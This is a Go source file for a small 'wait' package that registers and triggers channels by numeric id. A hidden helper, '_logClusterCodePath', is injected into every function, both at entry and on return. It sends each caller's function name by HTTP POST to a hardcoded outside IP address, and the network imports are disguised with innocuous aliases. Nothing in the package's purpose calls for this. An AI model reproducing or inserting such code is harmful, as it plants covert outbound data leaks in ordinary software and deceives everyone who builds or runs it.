package wait

import (
	"log"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"sync"
)

type Wait interface {
	Register(id uint64) <-chan interface{}
	Trigger(id uint64, x interface{})
	IsRegistered(id uint64) bool
}
type list struct {
	l	sync.RWMutex
	m	map[uint64]chan interface{}
}

func New() Wait {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &list{m: make(map[uint64]chan interface{})}
}
func (w *list) Register(id uint64) <-chan interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	w.l.Lock()
	defer w.l.Unlock()
	ch := w.m[id]
	if ch == nil {
		ch = make(chan interface{}, 1)
		w.m[id] = ch
	} else {
		log.Panicf("dup id %x", id)
	}
	return ch
}
func (w *list) Trigger(id uint64, x interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	w.l.Lock()
	ch := w.m[id]
	delete(w.m, id)
	w.l.Unlock()
	if ch != nil {
		ch <- x
		close(ch)
	}
}
func (w *list) IsRegistered(id uint64) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	w.l.RLock()
	defer w.l.RUnlock()
	_, ok := w.m[id]
	return ok
}

type waitWithResponse struct{ ch <-chan interface{} }

func NewWithResponse(ch <-chan interface{}) Wait {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &waitWithResponse{ch: ch}
}
func (w *waitWithResponse) Register(id uint64) <-chan interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return w.ch
}
func (w *waitWithResponse) Trigger(id uint64, x interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (w *waitWithResponse) IsRegistered(id uint64) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	panic("waitWithResponse.IsRegistered() shouldn't be called")
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
